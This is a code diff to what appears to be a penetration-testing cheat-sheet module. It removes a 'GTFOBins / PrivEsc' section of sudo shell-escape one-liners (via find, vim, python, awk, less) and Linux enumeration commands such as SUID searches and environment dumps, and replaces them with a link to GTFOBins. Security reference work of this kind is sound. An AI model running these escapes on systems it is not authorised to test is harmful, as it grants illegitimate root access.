@@ -254,29 +254,7 @@ export const CHEATSHEET = [
   },
   {
     tool: 'GTFOBins / PrivEsc',
-    categories: [
-      {
-        name: 'Sudo Escapes',
-        flags: [
-          { flag: 'sudo -l', desc: 'List allowed sudo commands for current user' },
-          { flag: 'sudo find . -exec /bin/bash \\;', desc: 'Escape via find' },
-          { flag: 'sudo vim -c \'!bash\'', desc: 'Escape via vim' },
-          { flag: 'sudo python3 -c \'import os; os.system("/bin/bash")\'', desc: 'Escape via python' },
-          { flag: 'sudo awk \'BEGIN {system("/bin/bash")}\'', desc: 'Escape via awk' },
-          { flag: 'sudo less /etc/passwd  # then: !/bin/bash', desc: 'Escape via less' }
-        ]
-      },
-      {
-        name: 'Enumeration',
-        flags: [
-          { flag: 'find / -perm -4000 2>/dev/null', desc: 'Find SUID binaries' },
-          { flag: 'find / -perm -2000 2>/dev/null', desc: 'Find SGID binaries' },
-          { flag: 'find / -writable -type f 2>/dev/null', desc: 'Find world-writable files' },
-          { flag: 'cat /etc/crontab', desc: 'Check cron jobs' },
-          { flag: 'env', desc: 'Dump environment variables' },
-          { flag: 'id && whoami', desc: 'Current user and groups' }
-        ]
-      }
-    ]
+    link: 'https://gtfobins.github.io',
+    categories: []
   }
 ];
